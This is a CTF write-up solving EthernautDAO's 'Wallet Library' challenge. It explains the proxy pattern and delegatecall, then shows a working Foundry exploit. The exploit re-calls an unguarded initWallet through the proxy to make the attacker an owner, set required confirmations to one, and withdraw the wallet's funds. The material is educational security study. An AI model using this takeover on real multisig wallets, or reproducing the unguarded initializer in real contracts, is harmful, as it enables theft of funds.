---
title: 'EthernautDAO CTF — Wallet Solution'
excerpt: ΞthernautDAO is common goods DAO aimed at transforming developers into Ethereum developers. </br></br>Our goal is to be able to add **ourselves** to the list of the owners and execute a transaction.
coverImage:
  url: '/assets/blog/ethernautdao.jpeg'
  credit:
    name: ΞthernautDAO
    url: https://twitter.com/EthernautDAO
date: '2022-07-13T07:00:00.000Z'
author:
  name: Emanuele Ricci
  twitter: StErMi
  picture: '/assets/blog/authors/stermi.jpeg'
ogImage:
  url: '/assets/blog/ethernautdao.jpeg'
---

[ΞthernautDAO](https://twitter.com/EthernautDAO) is common goods DAO aimed at transforming developers into Ethereum developers.

They started releasing CTF challenges on Twitter, so how couldn't I start solving them?

[https://twitter.com/EthernautDAO/status/1546101932040790016](https://twitter.com/EthernautDAO/status/1546101932040790016)

# CTF 2: Wallet Library

For this challenge, we have two different smart contracts to review:

[WalletLibrary](https://goerli.etherscan.io/address/0x43ff315d0003365fe1246344115a3142b9ebfe0b#code): A multisig wallet library

> Only deployed once, proxy contracts execute the functions via delegatecall
> Owners can:
>
> - Submit a transaction
> - Approve and revoke approval of pending transactions
> - Anyone can execute a transaction after enough owners approved it

[Wallet](https://goerli.etherscan.io/address/0x19c80e4ec00faaa6ca3b41b17b75f7b0f4d64cb7#code): A lightweight multisig wallet contract

> Calls will be delegated to the wallet library contract
> Owners can:
>
> - Submit a transaction
> - Approve and revoke approval of pending transactions
> - Anyone can execute a transaction after enough owners approved it

In the moment of deployment, the `Wallet` contract has three different owners and `numConfirmationsRequired` is equal to two. This mean that to execute a transaction from the wallet, at least two owners have to approve that transaction.

Our goal is to be able to add **ourselves** to the list of the owners and execute a transaction.

## Study the contracts

Let's review the logic of the contracts. The `Wallet` contract is a lightweight multisig wallet contract. When the users interact with it, two things can happen:

1. If someone (anyone) send some funds to it, the `receive` function will be triggered and those ethers will be stored in the contract's balance
2. Anything else, any function call, will be handled by the `fallback` function. This special function will forward the call to the **implementation** contract via `delegatecall`.

In practice, `Wallet` is just an implementation of the [OpenZeppelin Proxy](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/proxy/Proxy.sol) contract with some modification to automatically call the `initWallet` function on the implementation contract.

One thing that is important to always check is that the storage layout of the proxy and implementation will match. Because the implementation (`WalletLibrary`) will execute the logic code on the proxy's layout (`Wallet`) it's fundamental that they have the same storage layout. Otherwise, the implementation will **read and write from the wrong variables**!

I think that before anything we should understand two things

1. Why do we need Proxy Pattern, and what is it?
2. How `delegatecall` works and how it's used in the Proxy Pattern

### Proxy Pattern

I think that anyone here know that when you have deployed a Contract in the blockchain, you cannot override its code, right?

You can't do what you usually do in the web2 worlds where if you find a bug, or you want to add a new feature you just write down the code, create some tests and then deploy it in production.

You can't do that with the current Ethereum implementation. So, what if I would like to fix a bug in my code, or I would like to add a new feature?

The answer is the **Proxy Pattern**. The basic idea is this:

1. The proxy will store the address of the implementation and the storage of the contract
2. Any call to the contract itself will not directly interact with the contract, but will be forwarded via a `delegatecall` to the implementation contract
3. The implementation contract contains all the implementation logic that will modify the proxy state variables
4. If you find a bug in the implementation, or you want to add a new feature, you just need to update the code of the implementation, deploy the new contract and update the address of the implementation contract that you have stored in the Proxy contract. Now all the call to the proxy will be forwarded to the new implementation!

Now things are **much more complicated** than this and there are **tons of security concerns** that you must be aware of. I highly suggest you to read some article online and watch some videos made by Tincho Abbate because he explains this concept very, very well. When things get complicated like this, it is easy to make some mistake!

So, we now have some basic knowledge about the proxy pattern but as we understood everything is based on the concept of `delegatecall`. How does it work?

### `delegatecall`

`delegatecall` is a **special** opcode from EVM. Let's learn more about it from the Solidity Documentation:

> The code at the target address is executed in the context (i.e. at the address) of the calling contract and `msg.sender` and `msg.value` do not change their values.
> This means that a contract can dynamically load code from a different address at runtime. Storage, current address and balance still refer to the calling contract, only the code is taken from the called address.

What does it mean? Let's use our contract as an example. When you try to execute `initWallet` on the `Wallet` contract, solidity will not find that function inside the code and will execute the `fallback` function. The `fallback` function will execute a `delegatecall` toward the `WalletLibrary` contract, forwarding the whole operation.

This mean that the code that is executed is inside `WalletLibrary` but the **context** used is the one from the `Wallet` contract. By this, I mean that `msg.sender`, `msg.value` and the **storage** is the one from the `Wallet` call.

Basically, it's like if `WalletLibrary` will execute its code but on the `Wallet` contract. Any to a state variable be read and write on the `Wallet` storage!

### The flow

Now that we know the basic about proxy and delegate call, we can start reviewing the code and understand how it works.

When the `Wallet` contract is deployed, the `constructor` is executed

```solidity
constructor(
    address _walletLibrary,
    address[] memory _owners,
    uint256 _numConfirmationsRequired
) {
    walletLibrary = _walletLibrary;

    (bool success, ) = _walletLibrary.delegatecall(
        abi.encodeWithSignature("initWallet(address[],uint256)", _owners, _numConfirmationsRequired)
    );

    require(success, "initWallet failed");
}
```

it setup the `walletLibrary` address (the implementation of the contract), and will call `initWallet` on the `walletLibrary` via `delegatecall`. After that, it will check if the operation has been executed successfully; otherwise, it will revert.

After the initialization, `owners` will be able to use the multisig wallet by executing these functions:

- `submitTransaction` to propose a transaction
- `confirmTransaction` to confirm a proposed transaction. At least `numConfirmationsRequired` confirmations are needed to be able to execute the transaction
- `revokeConfirmation` to revoke a confirmation to a transaction
- `executeTransaction` to execute a transaction that has at least `numConfirmationsRequired` confirmations

## `initWallet` function

Let's review how the `Wallet` contract is set up by the `initWallet` function

```solidity
function initWallet(address[] memory _owners, uint256 _numConfirmationsRequired) public {
    // console.log("initWallet", _numConfirmationsRequired);

    require(_owners.length > 0, "owners required");
    require(
        _numConfirmationsRequired > 0 && _numConfirmationsRequired <= _owners.length,
        "invalid number of confirmations"
    );

    for (uint256 i = 0; i < _owners.length; i++) {
        address owner = _owners[i];

        require(owner != address(0), "invalid owner");
        require(!isOwner[owner], "owner not unique");

        isOwner[owner] = true;
        owners.push(owner);
    }

    numConfirmationsRequired = _numConfirmationsRequired;
}
```

The code will

- check that at least one `owner` for the wallet is provided
- the `_numConfirmationsRequired` required to confirm a transaction is lower or equal to the number of `_owners` provided otherwise the logic would stop to work. You would not be able to execute a transaction if the number of the confirmations needed are higher of the number of addresses that can confirm
- check that each owner is not the `address(0)` and that they are **unique**
- set up the `onwers` array and the `isOwner` mapping

From a logic point, I see that there's already a problem. There's no way to revoke an existing `owner` from the list of the address that can interact with the wallet. What if one of the owners get compromised or is a bad actor from the start? There is no way to revoke his/her access to the wallet!

Apart from that, do you see the **huge** security problem? Usually in a proxy contract you want to have a **guard** variable that prevent anyone from call again the initialization function. In this function, there is no guard at all. What are the consequences of this flaw?

Well, anyone could call again and again `wallet.initWallet` that will call via `delegatecall` `walletLibrary.initWallet` that will write in the `Wallet` storage passing arbitrary values.

This mean not only that I would be able to add my own address in the list of the `owners` but also that I'm able to override the `numConfirmationsRequired` variable and setting it to **one**.

This mean that in just **one single transaction** I'm able to

- add myself to the list of the owners
- set `numConfirmationsRequired` to 1 so only one confirmation is needed to execute a transaction
- create a transaction to transfer the `wallet` ETH funds (or transfer ERC20/ERC1155/ERC721 tokens)
- confirm it
- execute it

Let's see how it is possible in the solution part.

## Solution code

Now what we have to do is:

- Create an Alchemy or Infura account to be able to fork the Goerli blockchain
- Choose a good block from which we can create a fork. Any block after the creation of the contract will be good
- Run a foundry test that will use the fork to execute the test

Here's the code that I used for the test:

```solidity
// SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.13;

import "./utils/BaseTest.sol";
import "src/Wallet.sol";
import "src/WalletLibrary.sol";

contract WalletTest is BaseTest {
    Wallet private wallet;
    WalletLibrary private walletLibrary;

    constructor() {
        string[] memory userLabels = new string[](2);
        userLabels[0] = "Alice";
        userLabels[1] = "Bob";
        preSetUp(2, 100 ether, userLabels);
    }

    function setUp() public override {
        // Call the BaseTest setUp() function that will also create testsing accounts
        super.setUp();

        // Attach the contract to the addresses on the fork
        wallet = Wallet(payable(0x19c80e4Ec00fAAA6Ca3B41B17B75f7b0F4D64CB7));
        walletLibrary = WalletLibrary(payable(0x43FF315d0003365fe1246344115A3142b9EBfe0b));

        vm.label(address(wallet), "Wallet");
        vm.label(address(walletLibrary), "WalletLibrary");

        // We are funding the Wallet contract with 1 wei just to test the transaction that will allow us to withdraw from it!
        vm.deal(address(wallet), 1);
    }

    function testTakeOwnership() public {
        address player = users[0];
        vm.startPrank(player);

        // prepare the attack
        address[] memory owners = new address[](1);
        owners[0] = player;

        // call the `wallet.fallback` function passing the correct data to make it make a
        // delegatecall to walletLibrary that will execute initWallet on Wallet's context
        // initWallet should be protected by a flag that check if the contract has been initialized or not
        // like require(owners.length == 0)
        // by doing so we have been added to the list of owners
        // but we can execute any transaction we want because we have lowered the amount of needed confirmation request
        // required to only 1
        (bool success, ) = address(wallet).call(abi.encodeWithSignature("initWallet(address[],uint256)", owners, 1));

        assertEq(success, true);
        assertEq(wallet.numConfirmationsRequired(), 1);
        assertEq(wallet.owners(3), player);

        // Now I'm one of the owners and because numConfirmationsRequired = 1 I can execute tx
        // Let's create a transaction.
        (success, ) = address(wallet).call(
            abi.encodeWithSignature("submitTransaction(address,uint256,bytes)", player, 1, "")
        );
        assertEq(success, true);

        // Confirm the transaction we just created
        // At the moment of the creation of our transaction the transaction array was empty
        // So our txIndex is 0
        uint256 txIndex = 0;
        (success, ) = address(wallet).call(abi.encodeWithSignature("confirmTransaction(uint256)", txIndex));
        assertEq(success, true);

        // Execute the transaction
        uint256 playerBalanceBefore = player.balance;
        (success, ) = address(wallet).call(abi.encodeWithSignature("executeTransaction(uint256)", txIndex));
        assertEq(success, true);

        // Assert that we have received 1 wei from the Wallet contract
        assertEq(playerBalanceBefore + 1, player.balance);

        vm.stopPrank();
    }
}
```

Here is the command I have used to run the test: `forge test --match-contract WalletTest --fork-url <your_rpc_url> --fork-block-number 7178864 -vv`

Just remember to replace `<your_rpc_url>` with the RPC URL you got from Alchermy or Infura.

You can read the full solution of the challenge, opening [Wallet.t.sol](https://github.com/StErMi/ethernautdao-ctf/blob/main/test/Wallet.t.sol)

## Further reading

- [Solidity Docs: fallback function](https://docs.soliditylang.org/en/latest/contracts.html#fallback-function)
- [solidity-by-example: fallback function](https://solidity-by-example.org/fallback)
- [Solidity Docs: Delegatecall / Callcode and Libraries](https://docs.soliditylang.org/en/latest/introduction-to-smart-contracts.html#delegatecall-callcode-and-libraries)
- [SWC-112: Delegatecall to Untrusted Callee](https://swcregistry.io/docs/SWC-112)
- [Sigma Prime, Solidity Security: Comprehensive list of known attack vectors and common anti-patterns: delegatecall](https://blog.sigmaprime.io/solidity-security.html#delegatecall)
- [OpenZeppelin Proxy](https://docs.openzeppelin.com/upgrades-plugins/1.x/proxies)

## Disclaimer

All Solidity code, practices and patterns in this repository are DAMN VULNERABLE and for educational purposes only.

I **do not give any warranties** and **will not be liable for any loss** incurred through any use of this codebase.

**DO NOT USE IN PRODUCTION**.
